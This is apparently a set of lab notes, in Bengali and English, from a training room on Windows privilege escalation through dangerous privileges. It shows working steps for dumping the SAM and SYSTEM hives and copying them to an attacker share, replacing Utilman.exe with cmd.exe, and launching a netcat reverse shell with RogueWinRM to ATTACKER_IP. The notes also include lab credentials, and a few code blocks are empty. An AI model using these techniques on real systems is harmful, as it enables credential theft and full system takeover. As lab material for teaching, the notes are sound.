# Abusing Dangerous Privileges

## Windows Privileges

Privileges হলো কোনো user-এর নির্দিষ্ট system-related কাজ করার অধিকার। যেমন: system shutdown করা বা DACL-based access control bypass করা।

নিজের privileges দেখতে:

```
whoami /priv
```

- Windows-এর সব privileges: [Microsoft documentation](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment?utm_source=chatgpt.com)
- Exploitable privileges list: [Priv2Admin GitHub](https://github.com/gtworek/Priv2Admin?utm_source=chatgpt.com)

এই section-এ ৩টি privilege abuse দেখানো হয়েছে।

## 1. SeBackup / SeRestore

এই privileges দিয়ে যেকোনো file-এর DACL উপেক্ষা করে read ও write করা যায়। মূল উদ্দেশ্য হলো Administrator access ছাড়াই system backup নেওয়া।

এগুলো ব্যবহার করে `SAM` ও `SYSTEM` registry hive copy করে local Administrator-এর password hash বের করা যায়।

RDP login:

```
User: THMBackup
Password: CopyMaster555
```

Accountটি `Backup Operators` group-এর সদস্য। এই group defaultভাবে `SeBackup` ও `SeRestore` পায়।

Privileges ব্যবহার করতে Command Prompt-এ Open as administrator দিতে হবে এবং password দিয়ে elevated console খুলতে হবে।

Privilege check:

```
whoami /priv
```

Output:

```

----------------------

============================= ============================== ========

SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

SAM ও SYSTEM backup:

```
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

দুটি hive attacker machine-এ SMB দিয়ে transfer করা যায়।

Attacker machine-এ SMB server:

```

```

এখানে `public` হলো share name, আর `share` হলো directory। Windows session-এর username ও password প্রয়োজন।

Windows থেকে transfer:

```
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

## 2. SeTakeOwnership

এই privilege দিয়ে system-এর যেকোনো object, যেমন file বা registry key-এর ownership নেওয়া যায়। এরপর নিজের প্রয়োজনীয় permission assign করা যায়।

RDP login:

```
User: THMTakeOwnership
Password: TheWorldIsMine2022
```

Command Prompt-এ Open as administrator দিয়ে elevated console খুলতে হবে।

Privilege check:

```
whoami /priv
```

Output:

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```

এখানে `utilman.exe` abuse করা হবে। এটি Windows-এর built-in Ease of Access application, যা lock screen-এ থাকে।

`utilman.exe` SYSTEM privilege-এ চলে। তাই এটিকে `cmd.exe` দিয়ে replace করলে SYSTEM shell পাওয়া যাবে।

Ownership নেওয়া:

```
takeown /f C:\Windows\System32\Utilman.exe
```

Output:

```
SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".
```

Owner হলেই file-এর permission পাওয়া যায় না; তবে owner নিজের permission assign করতে পারে।

Full permission দেওয়া:

```
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```

Output:

```
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files
```

`cmd.exe` দিয়ে replace:

```
copy cmd.exe utilman.exe
```

Output:

```
1 file(s) copied.
```

এরপর Start button থেকে screen lock করে Ease of Access button click করলে SYSTEM privilege-এ Command Prompt পাওয়া যাবে।

## 3. SeImpersonate / SeAssignPrimaryToken

এই privileges দিয়ে অন্য user-এর access token impersonate করে তার security context-এ কাজ করা যায়।

Example: FTP server

ধরা যাক, FTP service `ftp` user দিয়ে চলছে।

Impersonation না থাকলে Ann login করলেও FTP service তার নিজের `ftp` access token দিয়ে Ann-এর file access করার চেষ্টা করবে।

সমস্যা:

- Ann-এর file `ftp` user-এর জন্য accessible করতে হবে; Bill-এর file access করতে পারবে না, যদি DACL permission না থাকে।
- সব file access `ftp` user-এর নামে হবে, তাই OS-এর পরিবর্তে FTP service-কে নিজে authorization manage করতে হবে।
- FTP service compromise হলে attacker `ftp` user-এর সব accessible folder পেয়ে যাবে।

`SeImpersonate` বা `SeAssignPrimaryToken` থাকলে FTP service login করা user-এর access token ব্যবহার করতে পারে।

ফলে:

- Ann login করলে Ann-এর token দিয়ে তার file access হবে।
- OS নিজেই authorization handle করবে।
- Ann-এর session-এ Bill বা Jude-এর file access করা যাবে না।

Attacker যদি এমন process control করতে পারে, তাহলে সেই process-এ connect ও authenticate করা user-কে impersonate করতে পারে।

Windows-এ সাধারণত নিচের account-গুলোতে এই privileges থাকে:

- `LOCAL SERVICE`
- `NETWORK SERVICE`
- `iis apppool\defaultapppool` (IIS-এর default application pool account)

Abuse করার জন্য প্রয়োজন:

1. এমন process তৈরি করা, যেখানে user connect ও authenticate করবে।
2. Privileged user-কে সেই malicious process-এ connect ও authenticate করানো।

এখানে RogueWinRM exploit ব্যবহার করা হবে।

### RogueWinRM

ধরা হয়েছে, IIS-এ চলা website compromise করে web shell পাওয়া গেছে:

```
http://MACHINE_IP/
```

Web shell দিয়ে account-এর privileges check করে নিশ্চিত করতে হবে যে `SeImpersonate` ও `SeAssignPrimaryToken` আছে।

Exploit location:

```
C:\tools\
```

কেন কাজ করে?

Windows-এ কোনো user BITS service start করলে সেটি SYSTEM privilege দিয়ে port `5985`-এ connection তৈরি করে।

- Port `5985` সাধারণত WinRM-এর জন্য ব্যবহৃত হয়।
- WinRM network-এর মাধ্যমে remote PowerShell console দেয়; SSH-এর মতো, তবে PowerShell ব্যবহার করে।
- WinRM service চালু না থাকলে attacker port `5985`-এ fake WinRM service চালু করে BITS-এর authentication attempt ধরতে পারে।
- `SeImpersonate` থাকলে connecting user অর্থাৎ SYSTEM-এর হয়ে command execute করা যায়।

Attacker machine-এ listener:

```
nc -lvp 4442
```

Web shell দিয়ে exploit চালানো:

```
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

- `-p`: কোন executable চালানো হবে; এখানে `nc64.exe`।
- `-a`: executable-এ পাঠানো arguments।
- `-e cmd.exe ATTACKER_IP 4442`: Netcat দিয়ে reverse shell তৈরি করবে।

Note: Exploit কাজ করতে ২ মিনিট পর্যন্ত লাগতে পারে। একাধিকবার চালালে BITS service বন্ধ হওয়ার অপেক্ষা করতে হয়। BITS service start হওয়ার ২ মিনিট পর নিজে থেকেই stop হবে।

Reverse shell:

```
user@attackerpc$ nc -lvp 4442
Listening on 0.0.0.0 4442
Connection received on 10.10.175.90 49755
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
nt authority\system
```

SYSTEM access
